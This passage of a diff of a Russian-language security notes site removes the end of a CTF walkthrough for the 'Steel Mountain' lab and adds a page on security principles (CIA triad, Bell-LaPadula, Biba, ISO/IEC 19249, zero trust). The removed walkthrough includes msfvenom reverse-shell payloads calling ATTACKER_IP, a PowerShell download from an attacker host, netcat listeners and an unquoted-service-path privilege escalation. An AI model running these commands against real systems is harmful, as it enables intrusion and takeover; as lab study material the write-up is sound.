-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>exploit<span class="w"> </span><span class="c1"># Получаем доступ к cmd целевой системы с правами пользователя от имени которого запущен и управляется HFS  </span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>search<span class="w"> </span>user.txt<span class="w"> </span><span class="c1"># Ищем userflag</span>
-</span></code></pre></div>
-<blockquote>
-<p>Попытка эскалировать права с помощью getsystem обернулась неудачей.
-Для поиска возможности эскалации прав используем PS скрипт для сбора информации о Windows системе - <code>PowerUp.ps1</code> из фреймворка <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a></p>
-</blockquote>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>upload<span class="w"> </span>PowerUp.ps1<span class="w"> </span><span class="c1"># Загружаем скрипт на машину</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>load<span class="w"> </span>powershell<span class="w"> </span><span class="c1"># Загружает модуль powershell для того, чтобы в последствии вызвать PS консоль</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>powershell_shell<span class="w"> </span><span class="c1"># Вызовет такую консоль``</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>.<span class="w"> </span>.<span class="se">\P</span>owerUp.ps1<span class="w"> </span><span class="c1"># не забываем про точку перед .\</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Invoke-AllChecks<span class="w"> </span><span class="c1"># Запускаем скрипт. Изучаем его вывод.</span>
-</span></code></pre></div>
-<blockquote>
-<p>Обращаем внимание на сервисы которые могут быть перезапущены текущим пользователем (<code>CanRestart True</code>) и имеют "незакавыченные" пути к исполняемым файлам. Это позволит нам остановить такой сервис, подменить его исполняемый файл на нужный нам, а затем заново запустить сервис.</p>
-</blockquote>
-<p><img alt="Result of work PowerUp.ps1" src="/images/steel_mountain_1.png" /></p>
-<p>Создаем payload в msfvenom:</p>
-<p><div class="language-Bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>ATTACKER_IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-f<span class="w"> </span>exe-service<span class="w"> </span>-o<span class="w"> </span><span class="nv">$SERVICE_NAME</span>.exe
-</span></code></pre></div>
-Останавливаем нужный сервис
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sc<span class="w"> </span>stop<span class="w"> </span><span class="nv">$SERVICE_NAME</span>
-</span></code></pre></div></p>
-<p>Загружаем payload с помощью <code>upload</code> подменяя экзешник сервиса.<br />
-Запускаем сервис <code>(sc start $SERVICE_NAME)</code> и ловим его на локальный netcat <code>(nc -lvnp 4443)</code>- получаем cmd с <code>NT_AUTHORITY</code> правами.</p>
-<h3 id="metasploit_1">Без использования metasploit</h3>
-<p>Получаем уязвимость на <a href="https://www.exploit-db.com/exploits/39161">exploit-db</a>.<br />
-Алгоритм работы скрипта реализующего уязвимости заключается в следующем:</p>
-<ol>
-<li>При первом запуске он подключается к HFS по указанному адресу, а затем стучится на <code>http://$ATTACKER_IP:80</code> для того, чтобы скачать <code>nc.exe</code> (бинарник netcat).  </li>
-<li>При втором запуске открывается cmd с правами пользователя запустившего HFS.</li>
-</ol>
-<p>Следовательно, для работы скаченного скрипта нужен бинарник <code>netcat</code> (можно взять <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">здесь</a> не забыв переименовать в <code>nc.exe</code>) и web сервер на 80 порту, с которого можно будет забрать <code>nc.exe</code> </p>
-<p><div class="language-Bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
-</span></code></pre></div>
-Создаем payload в msfvenom:</p>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>ATTACKER_IP<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-f<span class="w"> </span>exe-service<span class="w"> </span>-o<span class="w"> </span><span class="nv">$SERVICE_NAME</span>.exe
-</span></code></pre></div>
-<p>Загружаем payload:</p>
-<p><div class="language-Powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">powershell</span> <span class="n">-c</span> <span class="nb">wget </span><span class="s2">&quot;</span><span class="se">``</span><span class="s2">[</span><span class="se">``</span><span class="s2">http://10.14.37.38/$SERVICE_NAME.exe</span><span class="se">``</span><span class="s2">](http://10.14.37.38/$SERVICE_NAME.exe)</span><span class="se">``</span><span class="s2"> -OutFile $SERVICE_NAME.exe&quot;</span>
-</span></code></pre></div>
-Останавливаем нужный сервис <code>sc stop $SERVICE_NAME</code>.<br />
-Запускаем сервис <code>(sc start $SERVICE_NAME)</code> и ловим его на локальный netcat <code>nc -lvnp 4443</code>- получаем cmd с <code>NT_AUTHORITY</code> правами. </p>
+<h1 id="_1">Принципы обеспечения безопасности информации</h1>
+<h2 id="cia">Триада CIA и её коллеги.</h2>
+<p>Основная концепция ИБ в целом - поддержка информации в состоянии <strong>конфиденциальности (Confidentiality)</strong>, <strong>целостности (Integrity)</strong> и <strong>доступности (Availability)</strong>. 
+Концепция не просто так названа триадой: утратив лишь одно из состояний, информация не может считаться защищенной. Поэтому нет особого смысла пытаться защитить только одно из указанных свойств информации.</p>
+<ul>
+<li>
+<p><strong>Конфиденциальность</strong> - гарантирует, что доступ к информации имеется только у уполномоченного лица</p>
+</li>
+<li>
+<p><strong>Целостность</strong> - гарантирует, что информация не может быть изменена без необходимости, а любые неавторизованные изменения будут замечены</p>
+</li>
+<li>
+<p><strong>Доступность</strong> - гарантирует, что доступ к информации будет предоставлен уполномоченным лицам в любой необходимый момент времени.</p>
+</li>
+</ul>
+<p>В дополнение к вышеописанным "трём китам" можно отнести еще два свойства информации:  <strong>Аутентичность (Аuthenticity)</strong> и <strong>Неотказуемость (Non-repudiation)</strong>.</p>
+<ul>
+<li>
+<p><strong>Аутентичность</strong> - гарантирует, что информация была передана из конкретного источника</p>
+</li>
+<li>
+<p><strong>Неотказуемость</strong> - гарантирует, что источник не сможет отказаться от факта передачи информации.</p>
+</li>
+</ul>
+<p>В 1998 г. исследователь ИБ Donn Parker предложил свою концепцию состояния безопасности информации назвав её Parkerian Hexad (не знаю как перевести Hexad - пусть будет "шестиконечник") кроме уже упонятых CIA + autenticity, в неё входят следующие свойства информации:</p>
+<ul>
+<li>
+<p><strong>Полезность (Utility)</strong></p>
+</li>
+<li>
+<p><strong>Владение (Possesion)</strong></p>
+</li>
+</ul>
+<p>Описание можно почитать на <a href="https://en.wikipedia.org/wiki/Parkerian_Hexad">wiki</a></p>
+<p>"Антагонистом" CIA является <strong>DAD</strong>. В процессе вредоносного воздействия на информацию она может быть: </p>
+<ul>
+<li>
+<p><strong>Раскрыта (Disclosure)</strong></p>
+</li>
+<li>
+<p><strong>Изменена (Alteration)</strong></p>
+</li>
+<li>
+<p><strong>Уничтожена (Destruction)</strong>. </p>
+</li>
+</ul>
+<h2 id="_2">Модели безопасности.</h2>
+<p>Для построения системы обработки информации обеспечивающий CIA существуют различные модели безопасности, такие как:</p>
+<ul>
+<li>
+<p><strong>Модель Белла Лапатулы (Bell-La Padula Model)</strong></p>
+</li>
+<li>
+<p><strong>Модель Биба (Biba Model)</strong></p>
+</li>
+</ul>
+<h3 id="_3">Модель Белла Лапатулы</h3>
+<p>Модель контроля и управления доступом к информации в которой каждый субъект наделяется уровнем доступа, а каждый объект меткой доступа, так, что субъект с высоким уровнем доступа не может записывать объекты с низкой меткой доступа, а субъект с низким уровнем доступа не может читать объекты с высокой меткой доступа. В двух словах определение звучит как <em>"no write down, no read up"</em>
+Модель Белла Лапатулы направлена на контроль конфиденциальности информации.
+<img alt="" src="/images/Bell_Lapatuda.png" /></p>
+<h3 id="_4">Модель Биба</h3>
+<p>Модель похожая по своей сути на The Bell Lapatula model, однака в отличии от неё, направлена на контроль целостности информации.
+<img alt="" src="/images/biba.png" /></p>
+<h2 id="_5">Эшелонированная защита</h2>
+<p>Концепция направленная на использование различных средств информационной безопасности на различных уровнях. Вспоминая Cyber Kill Chain: нарушителю нужно пройти все 7 шагов, а защищающимся нужно остановить его всего на одном.</p>
+<p>В качестве примера можно привести организацию физической безопасности хранилища банка. Для непосредственного доступа к ценностям нужно преодолеть несколько периметров безопасности. Факт доступа обязательно будет зафиксирован в СКУД, попадет в объективы системы видеонаблюдения. Для получения доступа нужно ознакомится под подпись со множеством распорядительных документов.</p>
+<h2 id="isoiec-192492017">ISO/IEC 19249:2017</h2>
+<p>У нас в 2021 введён аналогичный <a href="https://protect.gost.ru/v.aspx?control=8&amp;baseC=6&amp;page=0&amp;month=2&amp;year=-1&amp;search=&amp;RegNum=1&amp;DocOnPageCount=15&amp;id=230563&amp;pageK=C6542435-52A8-47F3-8148-FB57C1062B1B">ГОСТ ISO/IEC TS 19249-2021. Информационные технологии. МЕТОДЫ И СРЕДСТВА ОБЕСПЕЧЕНИЯ БЕЗОПАСНОСТИ. Каталог принципов построения архитектуры и проектирования безопасных продуктов, систем и приложений</a></p>
+<p>В нём определяются 5 принципов построения архитектуры безопасных продуктов, систем и приложений: <strong>Разделение на домены</strong>, <strong>Использоваие многоуровневой архитектуры</strong>, <strong>Инкапсуляция</strong>, <strong>Отказоустойчивость</strong>, <strong>Виртуализация</strong>.</p>
+<h3 id="_6">Разделение на домены.</h3>
+<p>Предлагается группировать каждый набор связанных компонентов в одну сущность для более удобной работы с ними. 
+В качестве примера: режим работы ОС Linux сгруппированы в зависимости от степени привелегированности доступа к аппаратным средствам: Kernel space и User space.</p>
+<h3 id="_7">Использоваие многоуровневой архитектуры.</h3>
+<p>Разделение системы на уровни позволяет применять различные средства безопасности на различных уровнях.
+В качестве примера: Модель OSI позволяет применять различные средства безопасности на каждом отдельном уровне.</p>
+<h3 id="_8">Инкапсуляция.</h3>
+<p>Тут суть такая же как и в ООП - скрыть механизмы реализации функции за высокоуровнеными методами.
+В качестве примера: API для доступа к данным лучше чем прямой доступ к ним.</p>
+<h3 id="_9">Отказоустойчивость.</h3>
+<p>Принцип направленный на обеспечение доступности и целостности информации. Заключается в исключении единых точек отказа в системе. Достигается, как правило, резервированием.
+В качестве примера: использование RAID, использование нескольких источников электропитания и т.д.</p>
+<h3 id="_10">Виртуализация.</h3>
+<p>Вирутализация предоставляет возможности изолированных сред (песочниц) которые способствуют улучшению границ безопасности и позволяют отслеживать поведение вредоносных программ.</p>
+<p>Так же, в ISO/IEC 19249:2017 определены 5 принципов проектирования: <strong>Принцип наименьших привилегий</strong>, <strong>Минимизация поверхности атаки</strong>, <strong>Централизованная проверка параметров</strong>, <strong>Централизованные общие сервисы безопасности</strong>, <strong>Подготовка к обработке ошибок и исключений</strong>.</p>
+<h3 id="_11">Принцип наименьших привилегий.</h3>
+<p>Также известный как "need-to-know" в качестве ответа на вопрос "Кто имеет доступ к чему?". Принцип гласит о том, что необходимо предоставлять как можно меньше привелегий каждому пользователю системы, исходя из того, какие задачи он выполняет.
+Например: Если работнику службы безопаности нужно только просматривать поступающие в организацию счета, ему не нужен доступ для их редактирования или удаления.</p>
+<h3 id="_12">Принцип минимизации поверхности атаки.</h3>
+<p>Каждая система имеет уязвимости которые могут быть эксплуатированы злоумышленниками. Некоторые из уязвимостей известны и от них есть способы защиты, другие еще предстоит обнаружить. На защиту от последних и направлен данный принцип.
+В качестве примера: Одним из пунктов хардеринга машины с Linux является отключение не используемых сервисов, закрытие неиспользуемых сетевых портов.</p>
+<h3 id="_13">Принцип централизованной проверки параметров.</h3>
+<p>Огромное количество угроз связанно с недостаточной обработкой передаваемых в приложения параметров/данных. Некорректный ввод может привести к самым разным последствиям от DOS до RCE. Валидация входных данных перед передачей в приложение является крайне важным шагом к построению безопасных информационных систем. Учитывая количество различных систем, важно обеспечить наличие общих функций проверяющих параметры, которые бы позволяли проводить единый комплексный анализ этих функций на точность и полноту.</p>
+<h3 id="_14">Принцип централизованных общих сервисов безопасности.</h3>
+<p>Принцип гласит о стремлении к централизованного управления всеми имеющимися средствами защиты. </p>
+<h3 id="_15">Подготовка к обработке ошибок и исключений.</h3>
+<p>Ни одна система не застрахована от наличия ошибок. Системы должны быть организованны таким образом, чтобы позволять обнаруживать ошибки и исключения, сообщать о них и предпринимать автоматические действия либо для их устранения, либо для минимизации негативных последствий.</p>
+<h2 id="_16">Доверие и безопасность.</h2>
+<p>С точки зрения доверия, имеются два модели обеспечения безопасности: <strong>"Trust but Verify"</strong> и <strong>"Zero Trust"</strong>.</p>
+<h3 id="trust-but-verify">Trust but Verify.</h3>
+<p>Подход заключается в том, что всё должно подвергаться проверке в независимости от сущности или окружения (под сущностью следует понимать пользователя или устройство). Достигается такая проверка с помощью логирования и анализа этих логов на предмет наличия различных паттернов характеризующих не нормальную работу.</p>
+<h3 id="zero-trust">Zero Trust.</h3>
+<p>Модель с нулевым доверием рассматривает само доверие как угрозу. Исходя из этого и строится защита. Любая сущность считается нарушетелем, пока не докажет обратное. Если в других моделях сущности можно доверять исходя из различных индикаторов, например сущности расположенной во внутренней сети можно доверять (но проверять), то в Zero Trust сущности каждый раз нужно аутентифицироваться. 
+Одной из реализаций Zero Trust является микросегментация, в которой коммуникация между сегментами требует аутентификации. Ничто не мешает сделать каждое отдельное устройство отдельным сегментом, вопрос стоит лишь в балансе между удобством использования системы и её безопасности.</p>
+<h2 id="_17">Уязвимость. Угроза. Риск.</h2>
+<p>Три основных понятия которые используются практически в любых областях информационной безопасности.</p>
+<ul>
+<li>
+<p><strong>Уязвимость</strong> - слабое место в системе. Подверженность системы вредоносному воздействию.</p>
+</li>
+<li>
+<p><strong>Угроза</strong> - потенциальная или реальная опасность связанная с тем, что уязвимостью можно воспользоваться.</p>
+</li>
+<li>
+<p><strong>Риск</strong> - вероятность использования субъектом угрозы уязвимости системы для нарушения её нормальной работы.</p>
+</li>
+</ul>
+<p>В качестве примера: В квартире имеется очень ценный набор раритетных стаканов. Уязвимость этих стаканов заключается в тонкости стекла из которого они сделаны. Следовательно угрозой для таких стаканов будет не аккуратное обращение с ними, в результате которого они могут разбится. Перед тем как ставить такие стаканы на стол, нужно подумать о риске - вероятности того, что к концу вечера стаканов в набое станет меньше чем было в начале.</p>
 
 
   
@@ -3492,7 +3814,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Нижний колонтитул" >
         
           
-          <a href="../Skynet/" class="md-footer__link md-footer__link--prev" aria-label="Назад: Skynet">
+          <a href="../Terms_and_definitions/" class="md-footer__link md-footer__link--prev" aria-label="Назад: Термины и определения">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
@@ -3502,20 +3824,20 @@
                 Назад
               </span>
               <div class="md-ellipsis">
-                Skynet
+                Термины и определения
               </div>
             </div>
           </a>
         
         
           
-          <a href="../tomghost/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Tomghost">
+          <a href="../Cyber_Kill_Chain/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Cyber kill chain">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Вперед
               </span>
               <div class="md-ellipsis">
-                Tomghost
+                Cyber kill chain
               </div>
             </div>
             <div class="md-footer__button md-icon">
